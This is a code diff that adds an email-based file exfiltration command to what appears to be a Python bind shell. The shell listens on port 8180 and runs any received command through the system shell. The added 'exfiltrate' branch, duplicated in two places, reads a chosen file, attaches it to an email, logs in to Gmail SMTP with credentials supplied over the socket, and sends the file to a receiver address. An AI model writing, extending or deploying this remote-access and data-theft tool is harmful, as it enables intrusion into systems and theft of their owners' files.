@@ -6,6 +6,11 @@ import subprocess
 import threading
 import time
 from datetime import datetime
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
 hostIP = '0.0.0.0'
 hostPort = 8180
 banner = (b"""
@@ -42,8 +47,33 @@ def main():
                         if data.split(" ")[0] == "cd":
                             data = (data).strip()
                             os.chdir(data.split(" ")[1])
-                            self.csocket.send(bytes("\n".format(os.getcwd()).encode()))                         
-                                    
+                            self.csocket.send(bytes("\n".format(os.getcwd()).encode()))
+                        elif data.split(" ")[0] == "exfiltrate":
+                            data = (data).strip()
+                            file_name = (data.split(" ")[1])
+                            mail_content = file_name + " was sent from " + h_name + "."
+                            sender_address = (data.split(" ")[2])
+                            sender_pass =  (data.split(" ")[3])
+                            receiver_address = (data.split(" ")[4])
+                            message = MIMEMultipart()
+                            message['From'] = sender_address
+                            message['To'] = receiver_address
+                            message['Subject'] = ("Attachment sent from " + h_name + ".")
+                            message.attach(MIMEText(mail_content, 'plain'))
+                            attach_file_name = file_name
+                            attach_file = open(attach_file_name, 'rb')
+                            payload = MIMEBase('application', 'octate-stream')
+                            payload.set_payload((attach_file).read())
+                            encoders.encode_base64(payload)
+                            payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
+                            message.attach(payload)
+                            session = smtplib.SMTP('smtp.gmail.com', 587)
+                            session.starttls()
+                            session.login(sender_address, sender_pass)
+                            text = message.as_string()
+                            session.sendmail(sender_address, receiver_address, text)
+                            session.quit()
+                            self.csocket.send(bytes(b"Exfil complete.\n"))          
                         else:    
                             command = data
                             p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
@@ -62,6 +92,32 @@ def main():
                             data = (data).strip()
                             os.chdir(data.split(" ")[1])
                             self.csocket.send(bytes("\n".format(os.getcwd()).encode()))    
+                        elif data.split(" ")[0] == "exfiltrate":
+                            data = (data).strip()
+                            file_name = (data.split(" ")[1])
+                            mail_content = file_name + " was sent from " + h_name + "."
+                            sender_address = (data.split(" ")[2])
+                            sender_pass =  (data.split(" ")[3])
+                            receiver_address = (data.split(" ")[4])
+                            message = MIMEMultipart()
+                            message['From'] = sender_address
+                            message['To'] = receiver_address
+                            message['Subject'] = ("Attachment sent from " + h_name + ".")
+                            message.attach(MIMEText(mail_content, 'plain'))
+                            attach_file_name = file_name
+                            attach_file = open(attach_file_name, 'rb')
+                            payload = MIMEBase('application', 'octate-stream')
+                            payload.set_payload((attach_file).read())
+                            encoders.encode_base64(payload)
+                            payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
+                            message.attach(payload)
+                            session = smtplib.SMTP('smtp.gmail.com', 587)
+                            session.starttls()
+                            session.login(sender_address, sender_pass)
+                            text = message.as_string()
+                            session.sendmail(sender_address, receiver_address, text)
+                            session.quit()
+                            self.csocket.send(bytes(b"Exfil complete.\n"))                                
                         else:    
                             command = data
                             p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
